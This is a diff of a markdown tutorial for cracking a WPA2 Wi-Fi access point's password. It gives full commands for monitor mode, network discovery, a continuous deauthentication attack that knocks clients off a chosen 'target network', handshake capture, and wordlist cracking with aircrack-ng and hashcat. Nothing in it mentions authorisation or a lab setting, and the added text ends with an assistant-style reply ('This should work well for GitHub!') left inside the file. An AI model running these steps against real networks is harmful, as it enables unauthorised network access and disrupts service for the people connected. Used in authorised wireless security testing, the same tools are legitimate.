@@ -1,112 +1,187 @@
-## Wireless-Access-Point-Cracking
+---
 
-### Objective
-To capture and decrypt a Wi-Fi access point’s password hash by leveraging monitor mode to intercept data from nearby networks.
+# Wireless Access Point Cracking
 
-### Skills Learned
-* Network sniffing
-* De-authentication attacks
-* Password cracking
-* Use of Wi-Fi hacking tools (airodump-ng, aireplay-ng, aircrack-ng, hashcat)
+## Objective
+To capture and decrypt a Wi-Fi access point’s password by capturing and cracking a WPA2 handshake.
 
-### Tools Used
-* Kali Linux (or other Linux distribution with Wi-Fi hacking tools)
-* Wireless network adapter with monitor mode capability
+## Skills Learned
+- Network sniffing
+- De-authentication attacks
+- Password cracking
+- Using Wi-Fi hacking tools (airodump-ng, aireplay-ng, aircrack-ng, hashcat)
 
+## Tools Needed
+- **Kali Linux** (or any Linux distro with Wi-Fi hacking tools)
+- **Wireless Network Adapter** with monitor mode capability
 
-### Steps
+## Steps
 
-#### 1. Enable Monitor Mode:
-To start, ensure you have a compatible wireless card that supports **Monitor Mode**. This allows you to capture packets from surrounding networks without connecting to them. Run the following commands:
+---
 
-1.1 Identify your wireless card:
-   
-    
+### 1. Enable Monitor Mode
+
+Monitor mode is essential for capturing packets without needing to connect to a network.
+
+#### 1.1 Identify your wireless card:
 ```bash
-    
-    ifconfig
-    iwconfig
-    
+ifconfig
+iwconfig
 ```
-    
-1.2 Set the wireless card to **Monitor Mode**:
-    
+
+#### 1.2 Enable Monitor Mode:
 ```bash
-    
-    sudo ifconfig <interface> down
-    sudo iwconfig <interface> mode monitor
-    sudo ifconfig <interface> up
-    
+sudo ifconfig <interface> down
+sudo iwconfig <interface> mode monitor
+sudo ifconfig <interface> up
 ```
-#### *** Enable Monitor mode with *airmon-ng*
-  Sometimes we get error while changing the card mode with the lasts steps, so we can do it with   airmon-ng:
-   ```bash
-   sudo airmon-ng start <interface>
 
+#### 1.3 If you encounter issues, use `airmon-ng`:
+```bash
+sudo airmon-ng start <interface>
+```
+
+#### 1.4 Kill interfering processes if needed:
+```bash
+sudo airmon-ng check kill
+```
+
+#### 1.5 Verify monitor mode is enabled:
+```bash
+iwconfig
+```
+
+---
+
+### 2. Discover Networks
+
+With your wireless card in monitor mode, it’s time to capture network traffic.
+
+#### 2.1 Scan for all nearby networks:
+```bash
+airodump-ng <interface>
+```
+This shows a list of networks and details like BSSID (MAC address) and channel.
+
+#### 2.2 Choose your target network. Note down its BSSID and channel.
+
+#### 2.3 Target one access point:
+```bash
+airodump-ng -c <channel> --bssid <BSSID> -w <output_file> <interface>
+```
+- Replace `<channel>` with the target’s channel and `<BSSID>` with the network’s BSSID.
+- `<output_file>` is the name of the file to save captured data.
+
+---
+
+### 3. Perform a De-authentication Attack
+
+The purpose here is to disconnect clients so that, upon reconnection, we can capture the four-way handshake.
+
+#### 3.1 De-authenticate clients on the target network:
+```bash
+aireplay-ng -0 0 -a <BSSID> <interface>
+```
+- The `-0 0` flag will send deauthentication packets continuously until stopped.
+
+#### 3.2 Stop de-authentication after a few seconds (Ctrl + C) to allow clients to reconnect.
+
+---
+
+### 4. Capture the Four-Way Handshake
+
+To successfully crack the password, we need to capture the handshake, which occurs when a device reconnects to the network.
+
+#### 4.1 Continue running `airodump-ng` (Step 2.3) to monitor the network and capture the handshake.
+
+#### 4.2 Wait for a handshake notification in the airodump-ng window.
+
+#### 4.3 Stop airodump-ng once the handshake is captured (Ctrl + C).
+
+#### 4.4 You’ll see multiple files created with the prefix `<output_file>`. The file ending in `.cap` contains the captured handshake.
+
+---
+
+### 5. Cracking the Password Hash
+
+With the `.cap` file, we can now attempt to crack the password using a brute-force attack with a wordlist.
+
+---
+
+#### 5.1 Prepare the RockYou Wordlist
+
+Kali Linux comes with the large **rockyou.txt** wordlist, which contains over 10 million common passwords.
+
+1. Locate rockyou.txt:
+   ```bash
+   locate rockyou.txt
    ```
-  ##### 1. Sometimes there are Processes that might interfere with setting monitor mode. When that's the case we have to *Kill Conflict Processes*
-   ```bash
-   sudo airmon-ng check kill
+   It should be located at `/usr/share/wordlists/rockyou.txt.gz`.
 
+2. Copy and unzip rockyou.txt (optional):
+   ```bash
+   cp /usr/share/wordlists/rockyou.txt.gz ~/Desktop
+   gzip -d ~/Desktop/rockyou.txt.gz
    ```
- 
-1.3 Verify with `iwconfig`.
 
+---
 
-#### 2. Network Discovery:
-Now that your wireless card is in Monitor Mode, you can start capturing network traffic, specifically aiming to intercept a **four-way handshake** from a target wireless access point (AP).
+#### 5.2 Crack the Password with Aircrack-ng
 
-2.1 We'll use the next command to "Sniff" all the wireless access points around you.
+1. Run aircrack-ng using the `.cap` file and rockyou.txt wordlist:
    ```bash
-   airodump-ng <interface>
-
+   aircrack-ng -w ~/Desktop/rockyou.txt -b <target_BSSID> <path_to_capture.cap>
    ```
-This will display a list of wireless networks, their BSSIDs (MAC addresses), channels, and other information.
+   - Replace `<target_BSSID>` with the target’s BSSID.
+   - Replace `<path_to_capture.cap>` with the path to your `.cap` file.
 
-2.2 Choose a network to target. Note its BSSID and channel. (copy them to some note)
-   Ctrl + C when you found the Wireless network
+2. Monitor the cracking progress:
+   - **Current phrase:** Password currently being tested.
+   - **Progress:** Percent of the wordlist checked.
+   - **Speed:** Passwords tested per second.
+   - **Time left:** Estimated time remaining to test all passwords.
 
-2.3 We'll start the "Sniffing" process again, however, we're only going to "Sniff" one access point.
+---
+
+#### 5.3 Crack the Password with Hashcat
+
+To crack the password faster, we can use `hashcat`. First, we need to convert the `.cap` file to the `.hccapx` format.
+
+1. **Convert `.cap` to `.hccapx`:**
+   - Go to an online converter like [https://hashcat.net/cap2hccapx/](https://hashcat.net/cap2hccapx/).
+   - Upload your `.cap` file, convert it, and download the resulting `.hccapx` file.
+
+2. **Run Hashcat**:
    ```bash
-   airodump-ng -c <Channel> ---bssid <MAC address> -w <file name that we're going to write all of this in> wlan <name of the wireless interface>
-
-   ```   
-
-#### 3. De-authentication Attack:
-Tool: aireplay-ng
-Purpose: To force devices to re-authenticate, capturing the handshake.
-How-to: Use aireplay-ng to send de-authentication frames to the target network, causing devices to disconnect.
-3.1 Well use the next command to De-authenticate
-   ```bash
-   aireplay-ng -0 0 -a <MAC address of Wireless Access Point>
-
+   hashcat -a 0 -m 2500 <path_to_hccapx_file> ~/Desktop/rockyou.txt
    ```
-   the - 0 0 means it'll send de authentication packets indefinitely until we control C the program  and then it'll stop de authenticating. 
+   - `-a 0` specifies a dictionary attack mode.
+   - `-m 2500` is the hash type for WPA/WPA2.
+   - Replace `<path_to_hccapx_file>` with the path to your `.hccapx` file.
+   - `~/Desktop/rockyou.txt` is your wordlist.
 
-3.2 Ctrl + C after a few seconds/minutes so it discconects devices from the WAP.
+3. **Monitor Hashcat Output**:
+   - Type `s` to check status, speed, and progress.
+   - Hashcat may run much faster than Aircrack-ng, especially with GPU acceleration.
 
-#### 4. Capturing Handshake:
-Tool: airodump-ng
-Purpose: To capture the four-way handshake during re-authentication.
-How-to: Continue running airodump-ng with the target network's channel and BSSID to capture the handshake.
+4. **Check the Results**:
+   - If successful, Hashcat will display the cracked password.
+   - You can also see the **hash type** and **speed**. Hashcat often cracks passwords faster than Aircrack-ng, especially with GPU processing.
 
-4.1 After the De-authentication some devices will try to reconnect to the WAP, so go back to step 2.3 and "Sniff" the access point.
+---
 
-4.2 When someone connects it, well catch the WPA 2 Handshakes with the hashed value of the Password.
+## Final Result
 
-4.3 When you see the WPA Handshake, ctrl + C this program.
+Once the correct password is found, `hashcat` will stop and display it.
 
-4.4 Youll see that you have 4 different files on your desktop, well only use the one that ends with .cap.
-    Inside of it is the 4-way handshake with the hash value of the password.
-    
-#### 5. Cracking the Hash:
-Tools: aircrack-ng or hashcat
-Purpose: To break the hashed password.
-How-to: Use aircrack-ng to attempt a brute-force attack with a wordlist. hashcat can be used for more advanced attacks and GPU acceleration.
-*There are 2 ways we can get the hash value, with aircrack-ng or with hashcat
+> **Note:** The speed of cracking depends on factors such as wordlist size, processor power, and GPU use.
 
-##### 5.1 Aircrack-ng
+--- 
 
-5.1.1 
+This should work well for GitHub! Let me know if you need further adjustments.
+
+
+
+
 
  
